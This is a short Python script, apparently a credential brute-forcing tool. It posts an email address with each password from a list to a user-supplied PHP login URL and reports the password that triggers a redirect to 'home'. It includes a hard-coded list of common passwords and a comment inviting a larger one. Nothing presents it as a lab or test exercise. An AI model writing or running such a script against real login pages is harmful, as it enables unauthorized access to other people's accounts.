import requests

def brute_force_login(url, email, password_list):
    """
    Attempts to brute force the login for a given email using a list of passwords.

    Parameters:
    url (str): The URL of the login page.
    email (str): The email to login with.
    password_list (list): A list of passwords to try.

    Returns:
    str: The password if found, otherwise None.
    """
    with requests.Session() as session:
        for password in password_list:
            payload = {'email': email, 'password': password}
            response = session.post(url, data=payload)

            # Check if the login was successful by looking for specific text or headers
            if "location: home" in response.text.lower() or response.url.endswith("home"):
                print(f"Login successful with password: {password}")
                return password
            else:
                print(f"Login failed for password: {password}")
    
    print("Password not found in the provided list.")
    return None

if __name__ == "__main__":
    url = input("Enter the login URL of the PHP application (e.g., http://example.com/login.php): ")
    email = input("Enter the email to brute force: ")
    
    # Example password list, replace with a more comprehensive list as needed
    password_list = [
        'password1',
        'password123',
        'admin',
        'letmein',
        '123456',
        'password',
        'realpassword'
    ]

    brute_force_login(url, email, password_list)
